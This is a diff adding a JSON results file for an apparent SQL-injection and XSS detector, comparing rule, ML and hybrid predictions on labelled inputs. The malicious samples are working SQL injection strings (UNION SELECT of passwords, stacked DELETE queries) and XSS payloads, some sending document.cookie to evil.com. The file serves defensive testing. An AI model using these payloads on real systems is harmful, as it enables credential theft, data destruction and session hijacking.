@@ -1,0 +1,578 @@
+[
+  {
+    "text": "' OR '1'='1",
+    "label": "SQL_INJECTION",
+    "rulePrediction": "SQL_INJECTION",
+    "mlPrediction": "SQL_INJECTION",
+    "mlConfidence": 0.7808209549000755,
+    "hybridPrediction": "SQL_INJECTION",
+    "hybridReason": "rule match: SQL Injection pattern matched: boolean-based tautology (e.g. OR 1=1)"
+  },
+  {
+    "text": "1' OR '1' = '1",
+    "label": "SQL_INJECTION",
+    "rulePrediction": "SQL_INJECTION",
+    "mlPrediction": "SQL_INJECTION",
+    "mlConfidence": 0.7288355736871975,
+    "hybridPrediction": "SQL_INJECTION",
+    "hybridReason": "rule match: SQL Injection pattern matched: boolean-based tautology (e.g. OR 1=1)"
+  },
+  {
+    "text": "x' AND 1=1 --",
+    "label": "SQL_INJECTION",
+    "rulePrediction": "SQL_INJECTION",
+    "mlPrediction": "SQL_INJECTION",
+    "mlConfidence": 0.6980118192778454,
+    "hybridPrediction": "SQL_INJECTION",
+    "hybridReason": "rule match: SQL Injection pattern matched: boolean-based tautology (e.g. OR 1=1)"
+  },
+  {
+    "text": "X' AND 1=1 --",
+    "label": "SQL_INJECTION",
+    "rulePrediction": "SQL_INJECTION",
+    "mlPrediction": "SQL_INJECTION",
+    "mlConfidence": 0.6980118192778454,
+    "hybridPrediction": "SQL_INJECTION",
+    "hybridReason": "rule match: SQL Injection pattern matched: boolean-based tautology (e.g. OR 1=1)"
+  },
+  {
+    "text": "1 UNION SELECT name, role FROM accounts",
+    "label": "SQL_INJECTION",
+    "rulePrediction": "SQL_INJECTION",
+    "mlPrediction": "SQL_INJECTION",
+    "mlConfidence": 0.5243049566581294,
+    "hybridPrediction": "SQL_INJECTION",
+    "hybridReason": "rule match: SQL Injection pattern matched: UNION SELECT"
+  },
+  {
+    "text": "1 UNION SELECT email, id FROM accounts",
+    "label": "SQL_INJECTION",
+    "rulePrediction": "SQL_INJECTION",
+    "mlPrediction": "SQL_INJECTION",
+    "mlConfidence": 0.5127231277866637,
+    "hybridPrediction": "SQL_INJECTION",
+    "hybridReason": "rule match: SQL Injection pattern matched: UNION SELECT"
+  },
+  {
+    "text": "1 UNION SELECT username, password FROM admin_users",
+    "label": "SQL_INJECTION",
+    "rulePrediction": "SQL_INJECTION",
+    "mlPrediction": "SQL_INJECTION",
+    "mlConfidence": 0.549233229549662,
+    "hybridPrediction": "SQL_INJECTION",
+    "hybridReason": "rule match: SQL Injection pattern matched: UNION SELECT"
+  },
+  {
+    "text": "1 UNION SELECT name, role FROM admin_users",
+    "label": "SQL_INJECTION",
+    "rulePrediction": "SQL_INJECTION",
+    "mlPrediction": "SQL_INJECTION",
+    "mlConfidence": 0.6294706917076849,
+    "hybridPrediction": "SQL_INJECTION",
+    "hybridReason": "rule match: SQL Injection pattern matched: UNION SELECT"
+  },
+  {
+    "text": "1 UNION SELECT email, id FROM members",
+    "label": "SQL_INJECTION",
+    "rulePrediction": "SQL_INJECTION",
+    "mlPrediction": "SQL_INJECTION",
+    "mlConfidence": 0.5168086419023901,
+    "hybridPrediction": "SQL_INJECTION",
+    "hybridReason": "rule match: SQL Injection pattern matched: UNION SELECT"
+  },
+  {
+    "text": "1 UNION SELECT name, role FROM users",
+    "label": "SQL_INJECTION",
+    "rulePrediction": "SQL_INJECTION",
+    "mlPrediction": "SQL_INJECTION",
+    "mlConfidence": 0.536816987594578,
+    "hybridPrediction": "SQL_INJECTION",
+    "hybridReason": "rule match: SQL Injection pattern matched: UNION SELECT"
+  },
+  {
+    "text": "1 UNION SELECT email, id FROM admin_users",
+    "label": "SQL_INJECTION",
+    "rulePrediction": "SQL_INJECTION",
+    "mlPrediction": "SQL_INJECTION",
+    "mlConfidence": 0.6172017785324904,
+    "hybridPrediction": "SQL_INJECTION",
+    "hybridReason": "rule match: SQL Injection pattern matched: UNION SELECT"
+  },
+  {
+    "text": "1 UNION SELECT username, password FROM users",
+    "label": "SQL_INJECTION",
+    "rulePrediction": "SQL_INJECTION",
+    "mlPrediction": "SQL_INJECTION",
+    "mlConfidence": 0.4533650279514821,
+    "hybridPrediction": "SQL_INJECTION",
+    "hybridReason": "rule match: SQL Injection pattern matched: UNION SELECT"
+  },
+  {
+    "text": "1 UNION SELECT email, id FROM users",
+    "label": "SQL_INJECTION",
+    "rulePrediction": "SQL_INJECTION",
+    "mlPrediction": "SQL_INJECTION",
+    "mlConfidence": 0.5232642669347869,
+    "hybridPrediction": "SQL_INJECTION",
+    "hybridReason": "rule match: SQL Injection pattern matched: UNION SELECT"
+  },
+  {
+    "text": "1 UNION SELECT name, role FROM members",
+    "label": "SQL_INJECTION",
+    "rulePrediction": "SQL_INJECTION",
+    "mlPrediction": "SQL_INJECTION",
+    "mlConfidence": 0.5300664203060678,
+    "hybridPrediction": "SQL_INJECTION",
+    "hybridReason": "rule match: SQL Injection pattern matched: UNION SELECT"
+  },
+  {
+    "text": "1 UNION SELECT username, password FROM accounts",
+    "label": "SQL_INJECTION",
+    "rulePrediction": "SQL_INJECTION",
+    "mlPrediction": "SQL_INJECTION",
+    "mlConfidence": 0.45605146893254433,
+    "hybridPrediction": "SQL_INJECTION",
+    "hybridReason": "rule match: SQL Injection pattern matched: UNION SELECT"
+  },
+  {
+    "text": "1 UNION SELECT username, password FROM members",
+    "label": "SQL_INJECTION",
+    "rulePrediction": "SQL_INJECTION",
+    "mlPrediction": "SQL_INJECTION",
+    "mlConfidence": 0.4579412336495854,
+    "hybridPrediction": "SQL_INJECTION",
+    "hybridReason": "rule match: SQL Injection pattern matched: UNION SELECT"
+  },
+  {
+    "text": "1; DELETE FROM users WHERE 1=1",
+    "label": "SQL_INJECTION",
+    "rulePrediction": "SQL_INJECTION",
+    "mlPrediction": "SQL_INJECTION",
+    "mlConfidence": 0.5389357123254812,
+    "hybridPrediction": "SQL_INJECTION",
+    "hybridReason": "rule match: SQL Injection pattern matched: stacked query"
+  },
+  {
+    "text": "1; DELETE FROM admin_users WHERE 1=1",
+    "label": "SQL_INJECTION",
+    "rulePrediction": "SQL_INJECTION",
+    "mlPrediction": "SQL_INJECTION",
+    "mlConfidence": 0.6346925076526102,
+    "hybridPrediction": "SQL_INJECTION",
+    "hybridReason": "rule match: SQL Injection pattern matched: stacked query"
+  },
+  {
+    "text": "1; DELETE FROM accounts WHERE 1=1",
+    "label": "SQL_INJECTION",
+    "rulePrediction": "SQL_INJECTION",
+    "mlPrediction": "SQL_INJECTION",
+    "mlConfidence": 0.5221002855914227,
+    "hybridPrediction": "SQL_INJECTION",
+    "hybridReason": "rule match: SQL Injection pattern matched: stacked query"
+  },
+  {
+    "text": "1; DELETE FROM members WHERE 1=1",
+    "label": "SQL_INJECTION",
+    "rulePrediction": "SQL_INJECTION",
+    "mlPrediction": "SQL_INJECTION",
+    "mlConfidence": 0.5286104002341676,
+    "hybridPrediction": "SQL_INJECTION",
+    "hybridReason": "rule match: SQL Injection pattern matched: stacked query"
+  },
+  {
+    "text": "1' #",
+    "label": "SQL_INJECTION",
+    "rulePrediction": "SQL_INJECTION",
+    "mlPrediction": "SQL_INJECTION",
+    "mlConfidence": 0.5796816047923795,
+    "hybridPrediction": "SQL_INJECTION",
+    "hybridReason": "rule match: SQL Injection pattern matched: SQL comment sequence"
+  },
+  {
+    "text": "<script>alert(document.cookie)</script>",
+    "label": "XSS",
+    "rulePrediction": "XSS",
+    "mlPrediction": "XSS",
+    "mlConfidence": 0.8529122379655595,
+    "hybridPrediction": "XSS",
+    "hybridReason": "rule match: XSS pattern matched: <script> tag"
+  },
+  {
+    "text": "<sCrIpT>AlErT(DoCuMeNt.cOoKiE)</ScRiPt>",
+    "label": "XSS",
+    "rulePrediction": "XSS",
+    "mlPrediction": "XSS",
+    "mlConfidence": 0.8529122379655595,
+    "hybridPrediction": "XSS",
+    "hybridReason": "rule match: XSS pattern matched: <script> tag"
+  },
+  {
+    "text": "<SCRIPT>ALERT(DOCUMENT.COOKIE)</SCRIPT>",
+    "label": "XSS",
+    "rulePrediction": "XSS",
+    "mlPrediction": "XSS",
+    "mlConfidence": 0.8529122379655595,
+    "hybridPrediction": "XSS",
+    "hybridReason": "rule match: XSS pattern matched: <script> tag"
+  },
+  {
+    "text": "<oBjEcT DaTa=jAvAsCrIpT:AlErT(1)>",
+    "label": "XSS",
+    "rulePrediction": "XSS",
+    "mlPrediction": "XSS",
+    "mlConfidence": 0.8708729840282128,
+    "hybridPrediction": "XSS",
+    "hybridReason": "rule match: XSS pattern matched: javascript: URI scheme"
+  },
+  {
+    "text": "<OBJECT DATA=JAVASCRIPT:ALERT(1)>",
+    "label": "XSS",
+    "rulePrediction": "XSS",
+    "mlPrediction": "XSS",
+    "mlConfidence": 0.8708729840282128,
+    "hybridPrediction": "XSS",
+    "hybridReason": "rule match: XSS pattern matched: javascript: URI scheme"
+  },
+  {
+    "text": "<object data=javascript:alert(1)>",
+    "label": "XSS",
+    "rulePrediction": "XSS",
+    "mlPrediction": "XSS",
+    "mlConfidence": 0.8708729840282128,
+    "hybridPrediction": "XSS",
+    "hybridReason": "rule match: XSS pattern matched: javascript: URI scheme"
+  },
+  {
+    "text": "<iMg sRc=1 oNeRrOr=aLeRt(STrInG.FrOmChArCoDe(88,83,83))>",
+    "label": "XSS",
+    "rulePrediction": "XSS",
+    "mlPrediction": "XSS",
+    "mlConfidence": 0.6592905910762923,
+    "hybridPrediction": "XSS",
+    "hybridReason": "rule match: XSS pattern matched: inline event handler attribute"
+  },
+  {
+    "text": "<IMG SRC=1 ONERROR=ALERT(STRING.FROMCHARCODE(88,83,83))>",
+    "label": "XSS",
+    "rulePrediction": "XSS",
+    "mlPrediction": "XSS",
+    "mlConfidence": 0.6592905910762923,
+    "hybridPrediction": "XSS",
+    "hybridReason": "rule match: XSS pattern matched: inline event handler attribute"
+  },
+  {
+    "text": "<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",
+    "label": "XSS",
+    "rulePrediction": "XSS",
+    "mlPrediction": "XSS",
+    "mlConfidence": 0.6592905910762923,
+    "hybridPrediction": "XSS",
+    "hybridReason": "rule match: XSS pattern matched: inline event handler attribute"
+  },
+  {
+    "text": "<VIDEO><SOURCE ONERROR=ALERT(1)></VIDEO>",
+    "label": "XSS",
+    "rulePrediction": "XSS",
+    "mlPrediction": "XSS",
+    "mlConfidence": 0.7414872830728685,
+    "hybridPrediction": "XSS",
+    "hybridReason": "rule match: XSS pattern matched: inline event handler attribute"
+  },
+  {
+    "text": "<video><source onerror=alert(1)></video>",
+    "label": "XSS",
+    "rulePrediction": "XSS",
+    "mlPrediction": "XSS",
+    "mlConfidence": 0.7414872830728685,
+    "hybridPrediction": "XSS",
+    "hybridReason": "rule match: XSS pattern matched: inline event handler attribute"
+  },
+  {
+    "text": "<vIdEo><SoUrCe oNeRrOr=aLeRt(1)></ViDeO>",
+    "label": "XSS",
+    "rulePrediction": "XSS",
+    "mlPrediction": "XSS",
+    "mlConfidence": 0.7414872830728685,
+    "hybridPrediction": "XSS",
+    "hybridReason": "rule match: XSS pattern matched: inline event handler attribute"
+  },
+  {
+    "text": "<sCrIpT>WiNdOw.lOcAtIoN='hTtP://EvIl.cOm/sTeAl?c='+dOcUmEnT.CoOkIe</ScRiPt>",
+    "label": "XSS",
+    "rulePrediction": "XSS",
+    "mlPrediction": "XSS",
+    "mlConfidence": 0.7290904999829763,
+    "hybridPrediction": "XSS",
+    "hybridReason": "rule match: XSS pattern matched: <script> tag"
+  },
+  {
+    "text": "<script>window.location='http://evil.com/steal?c='+document.cookie</script>",
+    "label": "XSS",
+    "rulePrediction": "XSS",
+    "mlPrediction": "XSS",
+    "mlConfidence": 0.7290904999829763,
+    "hybridPrediction": "XSS",
+    "hybridReason": "rule match: XSS pattern matched: <script> tag"
+  },
+  {
+    "text": "<SCRIPT>WINDOW.LOCATION='HTTP://EVIL.COM/STEAL?C='+DOCUMENT.COOKIE</SCRIPT>",
+    "label": "XSS",
+    "rulePrediction": "XSS",
+    "mlPrediction": "XSS",
+    "mlConfidence": 0.7290904999829763,
+    "hybridPrediction": "XSS",
+    "hybridReason": "rule match: XSS pattern matched: <script> tag"
+  },
+  {
+    "text": "<link rel=stylesheet href=javascript:alert(1)>",
+    "label": "XSS",
+    "rulePrediction": "XSS",
+    "mlPrediction": "XSS",
+    "mlConfidence": 0.8038282820979179,
+    "hybridPrediction": "XSS",
+    "hybridReason": "rule match: XSS pattern matched: javascript: URI scheme"
+  },
+  {
+    "text": "<lInK ReL=StYlEsHeEt hReF=JaVaScRiPt:aLeRt(1)>",
+    "label": "XSS",
+    "rulePrediction": "XSS",
+    "mlPrediction": "XSS",
+    "mlConfidence": 0.8038282820979179,
+    "hybridPrediction": "XSS",
+    "hybridReason": "rule match: XSS pattern matched: javascript: URI scheme"
+  },
+  {
+    "text": "<LINK REL=STYLESHEET HREF=JAVASCRIPT:ALERT(1)>",
+    "label": "XSS",
+    "rulePrediction": "XSS",
+    "mlPrediction": "XSS",
+    "mlConfidence": 0.8038282820979179,
+    "hybridPrediction": "XSS",
+    "hybridReason": "rule match: XSS pattern matched: javascript: URI scheme"
+  },
+  {
+    "text": "best coffee near me",
+    "label": "NORMAL",
+    "rulePrediction": "NORMAL",
+    "mlPrediction": "NORMAL",
+    "mlConfidence": 0.6191702279571774,
+    "hybridPrediction": "NORMAL",
+    "hybridReason": "rule: normal; ml: normal"
+  },
+  {
+    "text": "search for blue shoes size 10",
+    "label": "NORMAL",
+    "rulePrediction": "NORMAL",
+    "mlPrediction": "NORMAL",
+    "mlConfidence": 0.6781767848924347,
+    "hybridPrediction": "NORMAL",
+    "hybridReason": "rule: normal; ml: normal"
+  },
+  {
+    "text": "what is the weather like in Hanoi today",
+    "label": "NORMAL",
+    "rulePrediction": "NORMAL",
+    "mlPrediction": "NORMAL",
+    "mlConfidence": 0.7358090960457895,
+    "hybridPrediction": "NORMAL",
+    "hybridReason": "rule: normal; ml: normal"
+  },
+  {
+    "text": "what is the weather like in Hue today",
+    "label": "NORMAL",
+    "rulePrediction": "NORMAL",
+    "mlPrediction": "NORMAL",
+    "mlConfidence": 0.7510138783682716,
+    "hybridPrediction": "NORMAL",
+    "hybridReason": "rule: normal; ml: normal"
+  },
+  {
+    "text": "what is the weather like in Ho Chi Minh City today",
+    "label": "NORMAL",
+    "rulePrediction": "NORMAL",
+    "mlPrediction": "NORMAL",
+    "mlConfidence": 0.75474320369054,
+    "hybridPrediction": "NORMAL",
+    "hybridReason": "rule: normal; ml: normal"
+  },
+  {
+    "text": "what is the weather like in Da Nang today",
+    "label": "NORMAL",
+    "rulePrediction": "NORMAL",
+    "mlPrediction": "NORMAL",
+    "mlConfidence": 0.7490143683547891,
+    "hybridPrediction": "NORMAL",
+    "hybridReason": "rule: normal; ml: normal"
+  },
+  {
+    "text": "checkout with credit card",
+    "label": "NORMAL",
+    "rulePrediction": "NORMAL",
+    "mlPrediction": "NORMAL",
+    "mlConfidence": 0.65299094910197,
+    "hybridPrediction": "NORMAL",
+    "hybridReason": "rule: normal; ml: normal"
+  },
+  {
+    "text": "great customer service, thank you",
+    "label": "NORMAL",
+    "rulePrediction": "NORMAL",
+    "mlPrediction": "NORMAL",
+    "mlConfidence": 0.6628691475312892,
+    "hybridPrediction": "NORMAL",
+    "hybridReason": "rule: normal; ml: normal"
+  },
+  {
+    "text": "flight from Hanoi to Singapore",
+    "label": "NORMAL",
+    "rulePrediction": "NORMAL",
+    "mlPrediction": "NORMAL",
+    "mlConfidence": 0.6642319602803124,
+    "hybridPrediction": "NORMAL",
+    "hybridReason": "rule: normal; ml: normal"
+  },
+  {
+    "text": "flight from Ho Chi Minh City to Singapore",
+    "label": "NORMAL",
+    "rulePrediction": "NORMAL",
+    "mlPrediction": "NORMAL",
+    "mlConfidence": 0.6898544488865093,
+    "hybridPrediction": "NORMAL",
+    "hybridReason": "rule: normal; ml: normal"
+  },
+  {
+    "text": "flight from Hue to Singapore",
+    "label": "NORMAL",
+    "rulePrediction": "NORMAL",
+    "mlPrediction": "NORMAL",
+    "mlConfidence": 0.6851257894680999,
+    "hybridPrediction": "NORMAL",
+    "hybridReason": "rule: normal; ml: normal"
+  },
+  {
+    "text": "flight from Da Nang to Singapore",
+    "label": "NORMAL",
+    "rulePrediction": "NORMAL",
+    "mlPrediction": "NORMAL",
+    "mlConfidence": 0.6797639389219972,
+    "hybridPrediction": "NORMAL",
+    "hybridReason": "rule: normal; ml: normal"
+  },
+  {
+    "text": "carol left a 5 star review",
+    "label": "NORMAL",
+    "rulePrediction": "NORMAL",
+    "mlPrediction": "NORMAL",
+    "mlConfidence": 0.6590469388919895,
+    "hybridPrediction": "NORMAL",
+    "hybridReason": "rule: normal; ml: normal"
+  },
+  {
+    "text": "bob left a 5 star review",
+    "label": "NORMAL",
+    "rulePrediction": "NORMAL",
+    "mlPrediction": "NORMAL",
+    "mlConfidence": 0.634339570255983,
+    "hybridPrediction": "NORMAL",
+    "hybridReason": "rule: normal; ml: normal"
+  },
+  {
+    "text": "dave left a 5 star review",
+    "label": "NORMAL",
+    "rulePrediction": "NORMAL",
+    "mlPrediction": "NORMAL",
+    "mlConfidence": 0.6440096575229629,
+    "hybridPrediction": "NORMAL",
+    "hybridReason": "rule: normal; ml: normal"
+  },
+  {
+    "text": "alice left a 5 star review",
+    "label": "NORMAL",
+    "rulePrediction": "NORMAL",
+    "mlPrediction": "NORMAL",
+    "mlConfidence": 0.6747508372382336,
+    "hybridPrediction": "NORMAL",
+    "hybridReason": "rule: normal; ml: normal"
+  },
+  {
+    "text": "directions to the nearest train station",
+    "label": "NORMAL",
+    "rulePrediction": "NORMAL",
+    "mlPrediction": "NORMAL",
+    "mlConfidence": 0.7081640513836818,
+    "hybridPrediction": "NORMAL",
+    "hybridReason": "rule: normal; ml: normal"
+  },
+  {
+    "text": "the temperature is below 1 degree today",
+    "label": "NORMAL",
+    "rulePrediction": "NORMAL",
+    "mlPrediction": "NORMAL",
+    "mlConfidence": 0.7185264701185539,
+    "hybridPrediction": "NORMAL",
+    "hybridReason": "rule: normal; ml: normal"
+  },
+  {
+    "text": "O'Brien confirmed the reservation for 7 guests",
+    "label": "NORMAL",
+    "rulePrediction": "NORMAL",
+    "mlPrediction": "NORMAL",
+    "mlConfidence": 0.7257531443262065,
+    "hybridPrediction": "NORMAL",
+    "hybridReason": "rule: normal; ml: normal"
+  },
+  {
+    "text": "O'Brien confirmed the reservation for 256 guests",
+    "label": "NORMAL",
+    "rulePrediction": "NORMAL",
+    "mlPrediction": "NORMAL",
+    "mlConfidence": 0.7446272514770781,
+    "hybridPrediction": "NORMAL",
+    "hybridReason": "rule: normal; ml: normal"
+  },
+  {
+    "text": "O'Brien confirmed the reservation for 42 guests",
+    "label": "NORMAL",
+    "rulePrediction": "NORMAL",
+    "mlPrediction": "NORMAL",
+    "mlConfidence": 0.7356286289070955,
+    "hybridPrediction": "NORMAL",
+    "hybridReason": "rule: normal; ml: normal"
+  },
+  {
+    "text": "O'Brien confirmed the reservation for 108 guests",
+    "label": "NORMAL",
+    "rulePrediction": "NORMAL",
+    "mlPrediction": "NORMAL",
+    "mlConfidence": 0.7362412993063058,
+    "hybridPrediction": "NORMAL",
+    "hybridReason": "rule: normal; ml: normal"
+  },
+  {
+    "text": "drop by our store this weekend for a sale",
+    "label": "NORMAL",
+    "rulePrediction": "NORMAL",
+    "mlPrediction": "NORMAL",
+    "mlConfidence": 0.6079459162333767,
+    "hybridPrediction": "NORMAL",
+    "hybridReason": "rule: normal; ml: normal"
+  },
+  {
+    "text": "delete old messages to free up space",
+    "label": "NORMAL",
+    "rulePrediction": "NORMAL",
+    "mlPrediction": "NORMAL",
+    "mlConfidence": 0.6401431300348747,
+    "hybridPrediction": "NORMAL",
+    "hybridReason": "rule: normal; ml: normal"
+  },
+  {
+    "text": "update your notification preferences anytime",
+    "label": "NORMAL",
+    "rulePrediction": "NORMAL",
+    "mlPrediction": "NORMAL",
+    "mlConfidence": 0.6754026018456887,
+    "hybridPrediction": "NORMAL",
+    "hybridReason": "rule: normal; ml: normal"
+  }
+]
